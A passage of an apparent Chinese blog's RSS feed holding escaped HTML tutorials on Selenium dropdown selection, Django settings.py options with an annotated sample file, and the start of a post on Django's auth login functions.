&lt;tr&gt;
&lt;td&gt;deselect_all()&lt;/td&gt;
&lt;td&gt;取消所有选项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;deselect_by_index()&lt;/td&gt;
&lt;td&gt;取消对应index选项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;deselect_by_value()&lt;/td&gt;
&lt;td&gt;取消对应value选项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;deselect_by_visible_text()&lt;/td&gt;
&lt;td&gt;取消对应文本选项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;first_selected_option()&lt;/td&gt;
&lt;td&gt;返回第一个选项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;all_selected_options()&lt;/td&gt;
&lt;td&gt;返回所有的选项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;options()&lt;/td&gt;
&lt;td&gt;返回所以的选择项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;all_selected_options()&lt;/td&gt;
&lt;td&gt;返回所以已选中的选择项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;first_selected_option()&lt;/td&gt;
&lt;td&gt;返回选中的第一个选择项&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;3使用&#34;&gt;3.使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;select &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_name(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 根据下标选择，从0开始&lt;/span&gt;
Select(select)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;select_by_index(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 根据value的值选择&lt;/span&gt;
Select(select)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;select_by_value(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;)
time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 根据text选择&lt;/span&gt;
Select(select)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;select_by_visible_text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AA&amp;#39;&lt;/span&gt;)
time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 断言&lt;/span&gt;
select &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Select(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_xpath(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;))  &lt;span style=&#34;color:#75715e&#34;&gt;# 定位下拉框&lt;/span&gt;
print(select&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;first_selected_option&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)  &lt;span style=&#34;color:#75715e&#34;&gt;# 获取下拉框当前选中得值&lt;/span&gt;
select&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;select_by_value(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# 选择下拉框得另一个选项&lt;/span&gt;
time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
print(select&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;first_selected_option&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)  &lt;span style=&#34;color:#75715e&#34;&gt;# 重新获取下拉框选择的值&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—setting 文件</title>
        <link>https://ac-lm.github.io/posts/django/djangosetting-%E6%96%87%E4%BB%B6/</link>
        <pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/djangosetting-%E6%96%87%E4%BB%B6/</guid>
        <description>&lt;h2 id=&#34;1settingpy-配置文件&#34;&gt;1.setting.py 配置文件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;BASE_DIR&lt;/code&gt;：即为项目所在目录，&lt;code&gt;__file__&lt;/code&gt;可以获得当前文件的路径。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SECRET_KEY&lt;/code&gt;：一个特殊的 Django 安装的密钥，每当使用&lt;code&gt;Django-admin startproject&lt;/code&gt;时会自动生成一个。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DUBUG&lt;/code&gt;：默认值为 FALSE，当选择 TRUE 时，当我们的项目出错时可以使我们看到出错信息，但是为了防止被用户看到或者他人攻击，在项目上线后应改为 FALSE。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ALLOWED_HOSTS&lt;/code&gt;：默认值是一个空列表，列表中的值为哪些域名可以访问我们的 Django 项目。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;INSTALLED_APPS&lt;/code&gt;：安装的 APP 列表，Django 为我们默认添加了一些自带的项目，每个新创建的 APP 都要加入这个列表才可以被使用。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MIDDLEWARE&lt;/code&gt;：这是将要使用的中间件列表。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ROOT_URLCONF&lt;/code&gt;：表示根 URLconf 的完整 Python 导入路径。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TEMPLATES&lt;/code&gt;：模板文件配置。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WSGI_APPLICATION&lt;/code&gt;：配置 Django 项目的 WSGI 服务路径。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DATABASES&lt;/code&gt;：Django 的数据库设置，Django 默认的是 sqlite3 数据库。ENGINE 是选择对应我们选择的数据库的引擎，NAME 是数据库名称，HOST 是连接数据库所要用到的主机，还有 PORT 选择端口等许多选项。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AUTH_PASSWORD_VALIDATORS&lt;/code&gt;：用于检查用户密码强度的验证器列表，在为空的情况下就接受任意强度的用户密码。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LANGUAGE_CODE&lt;/code&gt;：Django 项目的语言代码，默认值为 en-us，值 zh-hans 汉语。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TIME_ZONE&lt;/code&gt;：时区，默认值是 UTC。当 USE_TZ 为 TRUE 时，无论 TZ 设置为何值 Django 都会使用系统默认的时区，例如要使用上海的时区则需将 USE_TZ=FALSE，TIME_ZONE=&amp;lsquo;Asia/Shanghai&amp;rsquo;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;USE_I18N&lt;/code&gt;：国际化，Django 允许开发者指定要翻译的字符串，也可以让访问者进行语言选择。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;USE_L10N&lt;/code&gt;：是否选择启用数据的本地化。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;USE_TZ&lt;/code&gt;：如果开启了 Time Zone 功能，则所有的存储和内部处理，甚至包括直接 print 显示全都是UTC的。只有通过模板进行表单输入/渲染输出的时候，才会执行 UTC 本地时间的转换。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;STATIC_URL&lt;/code&gt;：静态目录的所有文件，存放 css，js 等文件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;STATICFILES_DIRS&lt;/code&gt;：static 文件的路径。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MEDIA_URL&lt;/code&gt;：与 STATIC_URL 类似，存放用户上传的文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2示例文件&#34;&gt;2.示例文件&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
BASE_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dirname(os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dirname(os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;abspath(__file__)))
&lt;span style=&#34;color:#75715e&#34;&gt;# 引入os，os包可以对文件进行操作管理&lt;/span&gt;
SECRET_KEY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;^#kms19!iawj2b&amp;amp;v3egmynpfwj8^v@2f(_1+jlw+#^vy^pg7oy&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 随机生成的密钥&lt;/span&gt;
DEBUG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 代表是调试环境&lt;/span&gt;
ALLOWED_HOSTS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#75715e&#34;&gt;# 允许的主机路径，不填写或者ALLOWED_HOSTS = [&amp;#34;*&amp;#34;]代表允许任意主机域名，如果要指定，在里面输入，&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 比如域名只允许为 www.baidu.com 那么 ALLOWED_HOSTS = [&amp;#34;www.baidu.com&amp;#34;]&lt;/span&gt;
INSTALLED_APPS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.admin&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.auth&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.contenttypes&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.sessions&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.messages&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.staticfiles&amp;#39;&lt;/span&gt;,
]
&lt;span style=&#34;color:#75715e&#34;&gt;# 当前项目应用，只有加入这里才能进行模型同步等操作,注册app等&lt;/span&gt;
MIDDLEWARE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.middleware.security.SecurityMiddleware&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.sessions.middleware.SessionMiddleware&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.middleware.common.CommonMiddleware&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.middleware.csrf.CsrfViewMiddleware&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.auth.middleware.AuthenticationMiddleware&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.messages.middleware.MessageMiddleware&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.middleware.clickjacking.XFrameOptionsMiddleware&amp;#39;&lt;/span&gt;,
]
&lt;span style=&#34;color:#75715e&#34;&gt;# django的中间件,自己写的中间件要在这里填写路径注册,才会生效&lt;/span&gt;
ROOT_URLCONF &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;untitled.urls&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 主路由，也就是项目的主urls(根urls) &lt;/span&gt;
TEMPLATES &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
  {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BACKEND&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.template.backends.django.DjangoTemplates&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DIRS&amp;#39;&lt;/span&gt;: [os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(BASE_DIR, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;templates&amp;#39;&lt;/span&gt;)]
    ,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;APP_DIRS&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;OPTIONS&amp;#39;&lt;/span&gt;: {
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;context_processors&amp;#39;&lt;/span&gt;: [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.template.context_processors.debug&amp;#39;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.template.context_processors.request&amp;#39;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.auth.context_processors.auth&amp;#39;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.messages.context_processors.messages&amp;#39;&lt;/span&gt;,
      ],
    },
  },
]
&lt;span style=&#34;color:#75715e&#34;&gt;# 模版的处理,包括路径,处理的包等&lt;/span&gt;
WSGI_APPLICATION &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;untitled.wsgi.application&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 启动定义,将使用的WSGI应用程序对象的完整Python路径&lt;/span&gt;
DATABASES &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;default&amp;#34;&lt;/span&gt;: {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ENGINE&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;django.db.backends.mysql&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NAME&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;practice&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;# 需要自己手动创建数据库&lt;/span&gt;
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USER&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;root&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;318&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HOST&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;3306&lt;/span&gt;
  }
}
&lt;span style=&#34;color:#75715e&#34;&gt;# 数据库相关配置&lt;/span&gt;
AUTH_PASSWORD_VALIDATORS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
  {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NAME&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.auth.password_validation.UserAttributeSimilarityValidator&amp;#39;&lt;/span&gt;,
  },
  {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NAME&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.auth.password_validation.MinimumLengthValidator&amp;#39;&lt;/span&gt;,
  },
  {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NAME&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.auth.password_validation.CommonPasswordValidator&amp;#39;&lt;/span&gt;,
  },
  {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NAME&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.contrib.auth.password_validation.NumericPasswordValidator&amp;#39;&lt;/span&gt;,
  },
]
&lt;span style=&#34;color:#75715e&#34;&gt;# 启用密码验证&lt;/span&gt;
LANGUAGE_CODE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;en-us&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 语言 如中文: LANGUAGE_CODE = &amp;#39;zh-hans&amp;#39;&lt;/span&gt;
TIME_ZONE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UTC&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 时区  如中国上海时区: TIME_ZONE = &amp;#39;Asia/Shanghai&amp;#39;&lt;/span&gt;
USE_I18N &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 国际化&lt;/span&gt;
USE_L10N &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;如果USE_L10N设置为True，则区域设置指定的格式具有更高的优先级 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;admin 的时候想显示格式化时间，必须把 USE_L10N = False
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
USE_TZ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 系统时区&lt;/span&gt;
LOGGING &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;version&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;disable_existing_loggers&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;,
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;handlers&amp;#39;&lt;/span&gt;: {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;console&amp;#39;&lt;/span&gt;:{
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;level&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DEBUG&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;logging.StreamHandler&amp;#39;&lt;/span&gt;,
    },
  },
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;loggers&amp;#39;&lt;/span&gt;: {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;django.db.backends&amp;#39;&lt;/span&gt;: {
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;handlers&amp;#39;&lt;/span&gt;: [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;console&amp;#39;&lt;/span&gt;],
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;propagate&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;level&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DEBUG&amp;#39;&lt;/span&gt;,
    },
  }
}
&lt;span style=&#34;color:#75715e&#34;&gt;# Django利用python提供的logging模块，记录日志。&lt;/span&gt;
STATIC_URL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/static/&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 静态文件配置 如:&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;STATICFILES_DIRS = [
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  os.path.join(BASE_DIR, &amp;#39;static&amp;#39;),
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  ]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 自己定义时间显示格式 如:&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;DATE_FORMAT = &amp;#39;Y-m-d&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;DATETIME_FORMAT = &amp;#39;Y-m-d H:i:s&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 定义视图需要的一些限制 如:&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;MAX_CUSTOMER_NUM = 3 #数量限制
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—auth 用户认证模块</title>
        <link>https://ac-lm.github.io/posts/django/djangoauth-%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81%E6%A8%A1%E5%9D%97/</link>
        <pubDate>Mon, 26 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/djangoauth-%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81%E6%A8%A1%E5%9D%97/</guid>
        <description>&lt;h2 id=&#34;1介绍&#34;&gt;1.介绍&lt;/h2&gt;
&lt;p&gt;Django 内置了强大的用户认证系统&lt;code&gt;auth&lt;/code&gt;，它默认创建并使用&lt;code&gt;auth_user&lt;/code&gt;表来存储用户数据。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.contrib &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; auth  &lt;span style=&#34;color:#75715e&#34;&gt;# 使用auth认证系统&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.contrib.auth.models &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; User  &lt;span style=&#34;color:#75715e&#34;&gt;# auth认证系统默认使用User表&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2authauthenticate&#34;&gt;2.auth.authenticate()&lt;/h2&gt;
&lt;p&gt;Django 提供简单的用户认证功能，如果认证成功（用户名和密码正确有效），便会返回一个&lt;code&gt;User&lt;/code&gt;对象。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.contrib &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; auth
user_obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; auth&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;authenticate(username&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;username,password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pwd)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3authloginrequest-user&#34;&gt;3.auth.login(request, user)&lt;/h2&gt;
&lt;p&gt;该函数实现一个用户登录的功能，它本质上会在后端为该用户生成相关 session 数据。在使用&lt;code&gt;login(request, user_obj)&lt;/code&gt;登录后之后，便可以通过&lt;code&gt;request.user&lt;/code&gt;拿到当前登录的用户对象，否则&lt;code&gt;request.user&lt;/code&gt;得到的是一个匿名用户对象。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.shortcuts &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; render, HttpResponse, redirect
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.contrib &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; auth

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;login&lt;/span&gt;(request):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;method &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;:
        username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;)
        pwd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;)
